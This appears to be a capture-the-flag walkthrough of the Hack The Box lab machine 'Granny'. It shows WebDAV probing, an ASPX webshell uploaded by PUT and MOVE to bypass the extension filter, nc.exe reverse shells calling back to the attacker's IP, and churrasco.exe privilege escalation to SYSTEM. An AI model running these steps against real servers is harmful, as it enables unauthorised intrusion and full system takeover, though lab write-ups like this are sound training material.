As we saw with Nmap it is a web server, if we access to it we can pick some info from the headers

![[Pasted image 20230731165103.png]]

We will use davtest app to check available methods and files format to upload to the server

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Granny-10.10.10.15]
└─$ davtest -url http://10.10.10.15/ -cleanup 
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: 7jeMdi8C
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_7jeMdi8C
********************************************************
 Sending test files
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.jhtml
PUT     aspx    FAIL
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.php
PUT     shtml   FAIL
PUT     asp     FAIL
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.jsp
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.cfm
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.html
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.txt
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.pl
PUT     cgi     FAIL
********************************************************
 Checking for test file execution
EXEC    jhtml   FAIL
EXEC    php     FAIL
EXEC    jsp     FAIL
EXEC    cfm     FAIL
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.html
EXEC    html    FAIL
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.txt
EXEC    txt     FAIL
EXEC    pl      FAIL                                                                                                
********************************************************                                                            
 Cleaning up                                                                                                        
DELETE          FAIL:   http://10.10.10.15/DavTestDir_7jeMdi8C                                                             
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_7jeMdi8C
PUT File: http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.jhtml
PUT File: http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.php
PUT File: http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.jsp
PUT File: http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.cfm
PUT File: http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.html
PUT File: http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.txt
PUT File: http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.pl
Executes: http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.html
Executes: http://10.10.10.15/DavTestDir_7jeMdi8C/davtest_7jeMdi8C.txt
```

It looks like there are a lot of file type I can upload, but not aspx, which is what we want. We know that we can upload txt files some upload the aspx shell as text file and then rename it in the server. We will use the default shell located in `/usr/share/webshells/aspx/cmdasp.aspx`

```bash
┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Granny-10.10.10.15]
└─$ curl -X PUT http://10.10.10.15/shell.txt -d @cmdasp.aspx

┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Granny-10.10.10.15]
└─$ curl -X MOVE -H 'Destination:http://10.10.10.15/shell.aspx' http://10.10.10.15/shell.txt
```

And we got a shell

![[Pasted image 20230731173926.png]]

Now we can upload nc.exe binary and get a reverse shell to obtain a full equiped shell. Create a SMB Share to upload nc.exe and copy the binary in the server with our webshell

```bash
┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Granny-10.10.10.15]
└─$ cp /usr/share/windows-resources/binaries/nc.exe . 

┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Granny-10.10.10.15]
└─$ sudo impacket-smbserver share -smb2support .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

---------------------------

copy \\10.10.14.14\share\nc.exe C:\Windows\Temp\nc.exe
```

Set up a netcat listener and execute in the webshell a reverse shell

```bash
C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.14 1234

-----------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.15] 1032
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami                                                                                                              
nt authority\network service
```

And we got a full shell. We have checked access for some flags but nothing found, so lets escalate privileges

Storing system info in a text file in our attacker machine and running **[Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)** we found the following vulnerabilities

```bash
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 0 Minutes, 47 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 809 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,344 MB
Page File: In Use:         126 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A

------------------------------------------

┌──(venv)─(kali㉿kali)-[~/Documents/Resources/Windows-Exploit-Suggester]
└─$ python windows-exploit-suggester.py --database 2023-07-13-mssb.xls --systeminfo granny-test.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 1 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits
[*] there are now 356 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2003 SP2 32-bit'
[*] 
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*] 
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*] 
[E] MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important
[*]   http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC
[*] 
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*] 
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-062: Vulnerability in Message Queuing Service Could Allow Elevation of Privilege (2993254) - Important
[*]   http://www.exploit-db.com/exploits/34112/ -- Microsoft Windows XP SP3 MQAC.sys - Arbitrary Write Privilege Escalation, PoC
[*]   http://www.exploit-db.com/exploits/34982/ -- Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation
[*] 
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*] 
[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
[*] 
[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
[*]   http://www.exploit-db.com/exploits/34458/
[*] 
[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
[*] 
[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
[E] MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[M] MS13-071: Vulnerability in Windows Theme File Could Allow Remote Code Execution (2864063) - Important
[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[M] MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[M] MS09-065: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (969947) - Critical
[M] MS09-053: Vulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254) - Important
[M] MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important
[M] MS09-004: Vulnerability in Microsoft SQL Server Could Allow Remote Code Execution (959420) - Important
[M] MS09-002: Cumulative Security Update for Internet Explorer (961260) (961260) - Critical
[M] MS09-001: Vulnerabilities in SMB Could Allow Remote Code Execution (958687) - Critical
[M] MS08-078: Security Update for Internet Explorer (960714) - Critical
[*] done
```

We will try to escalate privileges with **[churrasco.exe](https://github.com/Re4son/Churrasco/raw/master/churrasco.exe)** so download it, use smb share to upload to the server and execute it with the following command

```bash
C:\Documents and Settings>C:\Windows\Temp\churrasco.exe -d "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.14 1234"

-----------------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234                                 
listening on [any] 1234 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.15] 1036
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```

And we are nt authority\system